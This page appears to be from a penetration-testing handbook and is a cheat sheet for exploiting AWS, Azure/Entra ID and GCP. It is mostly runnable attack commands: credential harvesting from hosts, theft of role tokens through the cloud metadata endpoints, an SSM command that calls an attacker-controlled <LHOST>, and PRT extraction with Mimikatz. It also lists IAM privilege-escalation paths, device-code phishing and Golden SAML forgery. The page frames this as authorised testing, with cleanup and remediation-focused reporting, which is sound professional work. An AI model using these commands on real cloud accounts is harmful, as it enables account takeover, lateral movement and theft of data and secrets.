---
title: "AWS, Azure / Entra ID & GCP Exploitation"
description: "Cloud exploitation: AWS IAM privesc and IMDS, Azure/Entra ID token abuse, and GCP service account impersonation"
tags:
  - Cloud
  - AWS
  - Azure
  - Entra ID
  - GCP
  - IMDS
---

# AWS, Azure / Entra ID & GCP Exploitation

!!! note "What this page is doing"
    Cloud commands should be read as an identity trace: identify the principal, inspect its effective permissions, use a canary resource, follow one approved assumption path, and revoke anything created. Never paste real keys into a notes page or shell history.

---

## 1. AWS

=== " Credential Discovery & Enumeration"

    ```bash
    # --- Where AWS creds hide on a compromised host ---
    cat ~/.aws/credentials ~/.aws/config
    cat /root/.aws/credentials
    env | grep -i aws
    find / -name "credentials" -path "*aws*" 2>/dev/null
    cat /var/lib/cloud/instance/user-data.txt 2>/dev/null # User-data scripts
    # Also: CI/CD variables, Docker config, Kubernetes secrets, .env files, ECS task metadata
    # --- Verify identity & permissions ---
    aws sts get-caller-identity
    aws iam list-attached-user-policies --user-name <USER>
    aws iam list-user-policies --user-name <USER>
    aws iam get-policy-version --policy-arn <ARN> --version-id v1
    # --- Enumerate EVERYTHING you can touch (use a dedicated profile) ---
    aws s3 ls
    aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,IP:PublicIpAddress,Profile:IamInstanceProfile}'
    aws secretsmanager list-secrets
    aws ssm describe-parameters
    aws lambda list-functions
    aws iam list-roles
    # --- Automated enumeration & attack paths ---
    ./pacu # AWS exploitation framework (many modules)
    scoutsuite aws # Multi-service security audit
    enumerate-iam.rb # Permission enumeration for the current creds
    cloudsplaining scan-policy-file --input-file policy.json
    ```

=== " AWS IAM Privilege Escalation Paths"

    ```text
    Classic escalation patterns (each requires just ONE permission):

    1. iam:CreatePolicyVersion -> create a new version of your policy with "*:*"
    2. iam:SetDefaultPolicyVersion -> point your policy at an admin version
    3. iam:AttachUserPolicy -> attach AdministratorAccess to yourself
    4. iam:AttachGroupPolicy -> attach admin policy to a group you're in
    5. iam:PutUserPolicy -> add an inline admin policy to yourself
    6. iam:CreateAccessKey (on other) -> create keys for an admin user
    7. iam:UpdateLoginProfile -> reset the console password of an admin
    8. iam:CreateLoginProfile -> create a console login for a service user
    9. iam:AddUserToGroup -> add yourself to the admin group
    10. sts:AssumeRole (over-permissive) -> assume a role with higher privileges
    11. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction -> RCE as the role
    12. iam:PassRole + ec2:RunInstances -> launch an instance with an admin instance profile
    13. iam:PassRole + glue:CreateDevEndpoint / cloudformation:CreateStack -> RCE as role
    14. lambda:UpdateFunctionCode -> backdoor an existing function -> steal its role
    15. ssm:SendCommand -> run commands on EC2 instances (as their role!)
    16. ec2:CreateSnapshot + ec2:ModifySnapshotAttribute -> copy a disk -> read secrets
    17. secretsmanager:GetSecretValue / ssm:GetParameter (aws_ssm, "SecureString")
    18. codebuild / codepipeline abuse -> inject build steps -> steal deployment roles
    ```

=== " EC2 Metadata (IMDS) Exploitation"

    ```bash
    # --- From an SSRF or from inside an instance ---
    # IMDSv1 (no token needed) — the easiest SSRF win:
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
    # Returns: AccessKeyId, SecretAccessKey, Token -> use directly:
    export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
    # IMDSv2 (requires PUT to get a token — check if your SSRF supports arbitrary methods):
    TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
            -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
    curl -H "X-aws-ec2-metadata-token: $TOKEN" \
         http://169.254.169.254/latest/meta-data/iam/security-credentials/
    # Also grab: user-data (often has bootstrap secrets!), hostname, AMI ID, network config
    curl http://169.254.169.254/latest/user-data
    # --- ECS / EKS task credentials ---
    curl $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI # ECS task role
    cat /var/run/secrets/kubernetes.io/serviceaccount/token # EKS pod identity
    ```

=== " S3 & SSM Abuse"

    ```bash
    # --- S3 bucket enumeration & misconfiguration hunting ---
    aws s3 ls s3://<BUCKET> --no-sign-request # Test public access
    aws s3 ls s3://<BUCKET> --recursive --summarize # With valid creds
    aws s3api get-bucket-acl --bucket <BUCKET>
    aws s3api get-bucket-policy --bucket <BUCKET>
    aws s3api get-bucket-policy-status --bucket <BUCKET>
    aws s3api list-object-versions --bucket <BUCKET> # Deleted files may be recoverable!
    # Brute force bucket names:
    cloud_enum -k <KEYWORD> -k <KEYWORD2>
    # GrayhatWarfare / lazy enumeration of public buckets in scope: https://buckets.grayhatwarfare.com/
    # --- SSM (Systems Manager): the "invisible" lateral movement path ---
    aws ssm describe-instance-information
    aws ssm send-command --document-name "AWS-RunShellScript" \
        --targets "Key=instanceids,Values=<INSTANCE_ID>" \
        --parameters commands="whoami;id;curl http://<LHOST>/pwned" \
        --comment "Maintenance"
    # SSM role abuse: a default AmazonSSM role with permissions can run commands on EVERY
    # instance holding that role -> lateral movement across the entire VPC.
    ```

---

## 2. Azure / Entra ID (Active Directory for the Cloud)

=== " Foothold & Enumeration"

    ```bash
    # --- Unauthenticated tenant reconnaissance ---
    # aadinternals / MicroBurst / roadrecon
    roadrecon gather -d <TENANT>.onmicrosoft.com -u '<USER>' -p 'Password123!'
    roadrecon gui # Browse users, groups, apps, service principals, devices
    # AzureHound (BloodHound for Entra ID)
    azurehound list -u '<USER>' -p 'Password123!' -t <TENANT_ID>
    # Then import into BloodHound CE and look for:
    # - Users with Azure AD roles (Global Admin, Privileged Role Admin, App Admin)
    # - Applications / SPs with directory roles or MS Graph app permissions
    # - Owned objects / ownership-based escalation edges
    # - Service principals you can add credentials to (Application Administrator!)
    # --- Az CLI enumeration with a stolen token ---
    az login --use-device-code
    az account list; az account show
    az ad user list --query "[].{UPN:userPrincipalName,ID:id}" -o table
    az role assignment list --all -o table
    az ad app list --all -o table
    ```

=== " Token, PRT & Device-Code Abuse"

    ```bash
    # --- Device code phishing -> refresh token -> full tenant session (see Red Team section) ---
    roadtx gettokens --device-code -c <CLIENT_ID> -r msgraph
    roadtx refreshtokento <NEW_RESOURCE>
    # --- PRT (Primary Refresh Token) abuse from a Windows host (needs local user session) ---
    # 1. Extract the PRT with Mimikatz / ROADtools / a beacon:
    # mimikatz # dpapi::cloudapkd /keyvalue:<key> /unprotect
    # 2. Convert the PRT into a cookie for browser/Graph access:
    roadtx prt -r <PRT> -k <KEY> -c <PRT_COOKIE>
    # 3. Instant SSO into any Microsoft cloud app = full M365 access (mail, files, Teams)
    # --- Token theft from disk / processes ---
    # Teams, OneDrive, Outlook, VS Code, Azure CLI, and PowerShell all cache tokens:
    # %LOCALAPPDATA%\.IdentityService\, %APPDATA%\Microsoft\Teams\..., ~/.azure/
    # Parse encrypted caches with the Windows DPAPI master key (SharpDPAPI / Mimikatz).
    ```

=== " Entra ID Attack Paths & Hybrid Pivot"

    ```text
    CLOUD-ONLY (Entra ID) PATHS:
      - Add credentials to an app/service principal you own or can control (App Admin)
        -> az ad app credential reset --id <APP_ID>
      - Consent grant abuse: illicit consent grant phishing -> mail/Graph access
      - Federated identity credential abuse (workload identity federation -> tenant role)
      - Privileged role elevation: activate a dynamic role, or abuse a role assignment via
        "Privileged Access Group" membership you can add yourself to
      - Managed Identity abuse on an Azure VM/Function:
          IMDS: curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
          -> then use the token to call ARM APIs (list secrets, add role assignment, run command)

    HYBRID (Entra Connect) — the highest-value finding in most enterprises:
      1. Compromise the Entra Connect service account or its server.
         - The AD DS Connector account (MSOL_<hash>) has Replicating Directory Changes on AD.
         - Extract it (it's stored on the Entra Connect server) -> DCSync the on-prem domain.
      2. Alternatively, an AD admin can abuse Entra Connect to create/alter cloud identities.
      3. ADFS in the mix -> Golden SAML (export ADFS signing cert + service account key
         -> forge SAML tokens for ANY cloud identity, including Global Admin).
    ```

---

## 3. GCP (Google Cloud Platform)

```bash
# --- Enumerate with the discovered service account or user creds ---
gcloud auth activate-service-account --key-file=sa_key.json
gcloud auth list; gcloud config list
gcloud projects list; gcloud organizations list
gcloud iam service-accounts list
gcloud projects get-iam-policy <PROJECT_ID> --format=json
gcloud services list --enabled
# --- Privilege escalation paths in GCP ---
# iam.serviceAccounts.actAs -> impersonate a more privileged SA
# iam.serviceAccounts.getAccessToken -> mint a token for another SA
# iam.serviceAccountKeys.create -> create a permanent key for a privileged SA
# iam.roles.update / iam.policies.setIamPolicy -> grant yourself owner
# cloudfunctions.deploy / run.services.update -> deploy code as the runtime SA
# compute.instances.setMetadata (ssh-keys) -> add your SSH key to a VM
gcloud iam service-accounts keys create key.json --iam-account=<SA_EMAIL>
gcloud auth print-access-token --impersonate-service-account=<SA_EMAIL>
gcloud compute ssh <INSTANCE> --zone <ZONE> # With added metadata SSH keys
# --- GCP metadata server ---
curl -H "Metadata-Flavor: Google" \
     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# --- Tooling ---
# gcp_enum, gcpwn, ScoutSuite (gcp), GCPBucketBrute
```

---

## 4. Cloud Kill Chain Summary

```text
1. DISCOVER : Buckets, subdomains, exposed CI/CD, leaked keys on GitHub, tenant IDs (OSINT)
2. INITIAL : Phish (device code / consent), exploit SSRF->IMDS, leaked API key, CI token
3. ENUMERATE : IAM policies, roles, managed identities, service accounts, cross-account trusts
4. ESCALATE : One-permission IAM privesc, workload role abuse, app credential injection
5. PIVOT : Cloud -> on-prem (hybrid identity), on-prem -> cloud (ADCS/ADFS/Entra Connect)
6. IMPACT : Data exfiltration (S3/Blob/GCS, secrets, mail), persistence (new keys/apps/roles)
7. CLEANUP : Revoke created keys/tokens/apps/roles; verify with CloudTrail / Entra audit logs
```

!!! tip "Reporting Tip for Cloud Findings"
    Always translate a cloud misconfiguration into **business impact** — e.g. "this role allows `s3:GetObject` on the customer-data bucket containing 2.4M records and PII" — and include the **exact remediation** (specific policy JSON, condition keys, and a suggested SCP/deny-boundary). Clients value this far more than the finding itself.